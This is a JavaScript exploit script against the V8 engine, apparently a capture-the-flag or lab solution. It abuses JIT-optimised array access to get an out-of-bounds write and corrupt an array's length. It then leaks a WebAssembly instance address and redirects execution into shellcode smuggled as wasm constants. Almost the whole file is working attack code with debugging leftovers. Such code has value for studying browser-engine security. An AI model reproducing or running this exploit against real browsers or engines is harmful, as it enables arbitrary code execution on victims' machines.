var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

/*
 * Converts a float to an int
 */
function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 0x20n);
}

/*
 * Converts an int to a float
 */
function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 0x20n);
        return f64_buf[0];
}

/*
 * Converts float to hex string
 */
function fhex(val) {
    return "0x" + ftoi(val).toString(16)
}

/*
 * Converts int to hex string
 */
function ihex(val) {
    return "0x" + val.toString(16)
}

// trigger should just mess up the length while preserving the rest of everything
// Actually, not sure if this is the case for stuff
// this is a write 
let a = [1.1,1.2];
let o = [{},{}];
let d = [1.1];
function reada(index) {
    let ret = a[index*1];
    /* %DebugPrint(a); */
    /* %SystemBreak(); */
    return ret;
}
function writea(index, val) {
    a[index*1] = val;
    return val;
}


for (let i = 0; i < 0x10000000; i++) {
    reada(0);
    writea(0, 3.3);
}

console.log(ihex(ftoi(reada(3))));
let back_len = ftoi(reada(3));
back_len = (0x1336n << 0x20n) + (back_len & 0xffffffffn);
writea(3, itof(back_len));
console.log(ihex(ftoi(reada(3))));

console.log(a.length);

let offset = Math.floor((0x48ac9 - 0x48aa1) / 8);

const wasm = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7e,0x7e,0x01,0x7e,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x78,0x01,0x76,0x01,0x01,0x7e,0x20,0x00,0x20,0x01,0x7c,0x21,0x02,0x20,0x02,0x42,0xe8,0xde,0x88,0xcb,0xe6,0x8d,0xd6,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xe8,0xde,0xcc,0xc3,0x86,0xe0,0xd6,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xc8,0x82,0x8f,0x87,0x82,0x92,0xe4,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xc8,0x82,0xe0,0x86,0x85,0x92,0xe4,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xc8,0x92,0x9e,0x87,0x89,0x92,0xe4,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xc8,0xe2,0x80,0x86,0xbb,0x87,0xe4,0xf5,0x06,0x7c,0x21,0x02,0x20,0x02,0x42,0xc8,0xe2,0xd8,0xc7,0x94,0xc6,0xf4,0x87,0x05,0x7c,0x21,0x02,0x20,0x02,0x0b])

let module = new WebAssembly.Module(wasm);
let wasm_instance = new WebAssembly.Instance(module);
let entry = wasm_instance.exports.main;

/* entry(0x00n, 0x00n); */
/* let temp = {}; */
o[0] = wasm_instance;
// %DebugPrint(wasm_instance);
/* %SystemBreak(); */
console.log(ihex(ftoi(reada(offset))));
let wasm_addr = ftoi(reada(offset)) & 0xffffffffn;
console.log(ihex(wasm_addr));
let wasm_rwx = wasm_addr;
let offset2 = Math.floor((0x4919d - 0x4910d) / 0x8);

/* console.log("start"); */
/* for (let i = 0n; i < 0x100n; i+=0x8n) { */
/*     writea(offset2, itof(wasm_rwx+i + (0x1336n << 0x20n))); */
/*     console.log(i, fhex(d[0])); */
/* } */



writea(offset2, itof(wasm_rwx+88n + (0x1336n << 0x20n)));
console.log(fhex(d[0]));
let x_page = ftoi(d[0]);
d[0] = itof(x_page + 0x6e1n);

console.log("d: ", fhex(d[0]));
entry(0x00n, 0x00n);

<EOF>
/* %DebugPrint(a); */
/* %DebugPrint(o); */

/* val = itof((n << 32n) + 0x4141414141n); */
/* oob = trigger(3,val); */
/* console.log(oob.length); */
/* %DebugPrint(oob); */
/* %SystemBreak(); */


